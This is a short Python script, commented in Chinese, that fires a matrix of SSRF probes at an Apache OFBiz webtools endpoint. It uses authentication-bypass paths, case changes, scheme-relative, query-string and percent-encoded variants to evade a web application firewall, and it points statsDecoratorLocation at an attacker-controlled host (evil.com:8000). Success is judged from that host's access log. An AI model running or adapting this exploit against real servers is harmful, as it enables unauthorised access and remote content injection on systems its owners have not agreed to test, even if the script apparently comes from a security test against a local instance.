# -*- coding: utf-8 -*-
"""OFBiz WAF 轮变异矩阵：每个变体独立打一发 SSRF 探测，用 infra 访问日志判定穿透。"""
import sys

sys.path.insert(0, "..")
from common import session  # noqa: E402

s = session()
BASE = "https://127.0.0.1:18381"

variants = [
    ("entry-bare", "/webtools/control/StatsSinceStart",
     {"statsDecoratorLocation": "http://evil.com:8000/probe/m3_bare"}),
    ("entry-slash", "/webtools/control/forgotPassword/StatsSinceStart/",
     {"statsDecoratorLocation": "http://evil.com:8000/probe/m3_slash"}),
    ("entry-upper", "/webtools/control/ForgotPassword/StatsSinceStart",
     {"statsDecoratorLocation": "http://evil.com:8000/probe/m3_upper"}),
    ("scheme-relative", "/webtools/control/forgotPassword/StatsSinceStart",
     {"statsDecoratorLocation": "//evil.com:8000/probe/m5_relative"}),
    ("query-param", "/webtools/control/forgotPassword/StatsSinceStart?statsDecoratorLocation=http://evil.com:8000/probe/m6_query",
     {}),
    ("percent-enc", "/webtools/control/forgotPassword/StatsSinceStart",
     {"statsDecoratorLocation": "http://%65vil.com:8000/probe/m7_pct"}),
]

for name, uri, data in variants:
    try:
        r = s.post(BASE + uri, data=data, timeout=25, allow_redirects=False)
        print("%-16s %s -> HTTP %s (%dB)" % (name, uri, r.status_code, len(r.content)))
    except Exception as e:  # noqa: BLE001
        print("%-16s EXC %s" % (name, str(e)[:80]))
print("== infra log 判定 ==")
